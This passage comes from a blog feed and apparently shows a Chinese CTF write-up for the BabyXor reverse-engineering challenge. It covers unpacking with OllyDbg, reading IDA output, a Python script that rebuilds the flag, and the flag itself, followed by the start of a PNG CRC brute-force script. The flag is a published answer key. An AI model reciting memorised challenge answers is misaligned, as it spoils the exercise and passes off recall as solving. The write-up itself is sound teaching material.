(--(_stream)-&gt;_cnt &gt;= 0 ? 0xff &amp; *(_stream)-&gt;_ptr++ : _filbuf(_stream))</code></li><li>函数定义如下：<br>  <code>_CRTIMP int __cdecl getc(FILE *)</code></li></ol><p>在Ｃ语言的各家编译器提供厂商里面有一个不成为的“潜规则”，那就是：<br><strong>如果一个标识符前面是以下划线开头，这样的标识符通常是编译器预定义的宏，或者预定义的标志符</strong></p><p>我们看宏定义，这里用到的宏实际还用到了一个预定义的函数：<br><code>_CRTIMP int __cdecl _filbuf(FILE *)</code></p><p>从这个函数可以看出在 <code>getc()</code> 宏中使用的：<code>_stream</code> 是一个具有文件指针类型性质的预定义标识符</p></blockquote><p>在 IDA 伪代码中，<code>_filbuf(&amp;File)</code> 的定义：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor19.png" alt="攻防世界_BabyXor19.png"></p><ol start="8"><li><p>继续往下：<br><code>v8 = sub_40108C(&amp;unk_435DC0, 56)</code> 函数会执行 <code>sub_401190(a1, a2)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor20.png" alt="攻防世界_BabyXor20.png"><br>内容就是简单的移位、异或操作，最后将结果返回给 <code>v8</code><br><code>Src = sub_401041(&amp;unk_435DC0, &amp;dword_435DF8, 0x38u)</code> 函数会执行 <code>sub_401240(a1, a2, Size)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor21.png" alt="攻防世界_BabyXor21.png"><br>操作也是移位、异或，将结果返回给 <code>Src</code><br><code>v5 = sub_4010C3(&amp;unk_435DC0, Src, &amp;dword_435E30, 56)</code> 函数会执行 <code>sub_401320(a1, a2, a3, a4)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor22.png" alt="攻防世界_BabyXor22.png"><br>跟前面都是差不多的，也是移位、异或，最后将结果返回给 <code>v5</code><br>最后执行 <code>sub_40101E(v8, Src, v5)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor23.png" alt="攻防世界_BabyXor23.png"><br>发现三个通过 <code>for</code> 循环的赋值操作<br>同时，三个参数都使用 <code>sub_4010A5()</code> 函数进行了处理，<code>sub_4010A5()</code> 函数会执行 <code>sub_401460(a1)</code><br>跟进一下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor24.png" alt="攻防世界_BabyXor24.png"><br>这里的 <code>i</code> 是一个指针，<code>a1</code> 也是一个指针<br>首先将 <code>i</code> 的初值设置为 <code>a1</code> 所指向的地址（其实就是参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的首地址）<br>for 循环的结束条件就是将 <code>a1</code> 所指向的非 <code>&#39;\0&#39;</code> 元素全部遍历完，也就是 <code>i</code> 指向参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的末尾<br>最后返回的 <code>i - a1</code> 是两个地址的差，差值其实就是字符串的长度<br>再结合三个 for 循环的内容，可知：<br><code>sub_40101E(v8, Src, v5)</code> 函数的功能是将 a1( <code>v8</code> )、a2( <code>Src</code> )、a3( <code>v5</code> ) 的内容拼接到 <code>v10</code> 所指向的地址中</p></li><li><p>查看一下这三个移位、异或函数所使用的数据<br><code>unk_435DC0</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor25.png" alt="攻防世界_BabyXor25.png"><br><code>dword_435DF8</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor26.png" alt="攻防世界_BabyXor26.png"><br><code>dword_435E30</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor27.png" alt="攻防世界_BabyXor27.png"></p></li><li><p>通过 IDA 生成 Python 列表：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>由于数据是小端序存放，每组中间间隔的 “0x00, 0x00, 0x00” 是高位<br>即：内存中 <code>&quot;0x1A, 0x00, 0x00, 0x00&quot;</code> 代表 <code>&quot;0x0000001A&quot;</code><br>根据 <code>a2 &gt;&gt; 2</code> 也可知，<code>56 &gt;&gt; 2 = 14</code>，每 4 个十六进制一组，共 56 &#x2F; 4 &#x3D; 14 组<br>所以导出的数据其实可以简化如下：（<em>可以在 Pycharm 中使用 Ctrl + F 进行替换快速得到</em>）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>    dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>    dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>按照程序逻辑，编写脚本，分别使用三个函数生成三个字符串，然后进行拼接</li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>  dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>  dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span>    v8 <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      v8 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span>      Src <span class="token operator">=</span> <span class="token string">""</span>  Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 下面的循环是从第二个元素开始，不要忘了还有个没改变的第一个值  </span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>unk_435DC0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> dword_435DF8<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>Src<span class="token punctuation">)</span>      Source <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Source <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Src<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  Destination <span class="token operator">=</span> <span class="token string">""</span>  Destination <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  v5 <span class="token operator">=</span> Destination <span class="token operator">+</span> Source  <span class="token keyword">print</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span>      flag <span class="token operator">=</span> v8 <span class="token operator">+</span> Src <span class="token operator">+</span> v5  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>由于发现 flag 与程序输入无关，是由程序内部的数据运算得到的<br>并且 <code>sub_40101E(v8, Src, v5)</code> 函数中直接拼接得到了 flag<br>所以 flag 一定会出现在程序中<br>于是可以通过调试来观察 flag</p></li><li><p>用 OllyDBG 打开<br>定位到最后拼接 flag 的 <code>sub_40101E(v8, Src, v5)</code> 函数处<br>根据 <code>call    sub_40101E</code> 的地址 <code>0x00401712</code> 处下断点<br>直接运行看堆栈数据就能得出 flag</p></li></ol><blockquote><p><del>但是前面我脱壳之后的程序只能在 IDA 中正常分析，却无法双击运行</del></p><p>原因找到了，在 <code>右键 --&gt; 用 OllyDump脱壳调试进程</code> 进行脱壳的时候<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor29.png" alt="攻防世界_BabyXor29.png"><br>左下角有两种方式<br>我前面是选择的 <code>方式 1</code>，虽然成功脱壳了，可以 IDA 静态分析，但是却无法运行程序<br>现在选了 <code>方式 2</code> 试了一下，发现既可以 IDA 静态分析，也可以运行程序了<br>（<mark>脱壳的时候最好两种方式都试一试</mark>）</p></blockquote><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor28.png" alt="攻防世界_BabyXor28.png"></p>]]></content>
    
    
    <summary type="html">攻防世界一道逆向，UNCTF2019 的一道题，主要考察 OllyDBG 手动脱壳，这里用到的是 ESP 脱壳定律，记录一下第一次手动调试脱壳的经历</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>杂项中的脚本</title>
    <link href="https://www.4ss1du0us.cn/2023/0560e8d6d2.html"/>
    <id>https://www.4ss1du0us.cn/2023/0560e8d6d2.html</id>
    <published>2023-05-09T08:11:01.000Z</published>
    <updated>2023-05-14T00:29:10.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CRC-爆破图片宽高"><a href="#CRC-爆破图片宽高" class="headerlink" title="CRC 爆破图片宽高"></a>CRC 爆破图片宽高</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E9%9A%90%E5%86%991.png" alt="隐写1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct  <span class="token keyword">import</span> zlib    <span class="token comment"># --------------- 需要修改的参数 ---------------</span><span class="token comment"># (直接从WinHex中以十六进制数值复制选块)</span>str1 <span class="token operator">=</span> <span class="token string">"49484452"</span>  <span class="token comment"># IHDR  </span>width <span class="token operator">=</span> <span class="token string">"01DA"</span>  <span class="token comment"># 图片宽度  </span>height <span class="token operator">=</span> <span class="token string">"00EF"</span>  <span class="token comment"># 图片高度  </span>str2 <span class="token operator">=</span> <span class="token string">"0806000000"</span>  <span class="token comment"># 图片高度height~CRC之间的5个字节  </span>crc32 <span class="token operator">=</span> <span class="token string">"52084BFB"</span>  <span class="token comment"># CRC  </span>add_num <span class="token operator">=</span> <span class="token number">2000</span>  <span class="token comment"># 最大宽高，合理修改快速出flag (一般可不修改)  </span><span class="token comment"># -------------------------------------------  </span>    <span class="token keyword">def</span> <span class="token function">hexStr2bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>      b <span class="token operator">=</span> <span class="token string">b""</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          temp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>          b <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> b      check <span class="token operator">=</span> <span class="token number">0</span>  bytes1 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>  bytes2 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>  crc <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>crc32<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  wid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  hei <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>height<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>wid<span class="token punctuation">,</span> wid <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hei<span class="token punctuation">,</span> hei <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>          width <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          height <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          bytes_temp <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>width <span class="token operator">+</span> height<span class="token punctuation">)</span>          <span class="token keyword">if</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>bytes1 <span class="token operator">+</span> bytes_temp <span class="token operator">+</span> bytes2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">eval</span><span 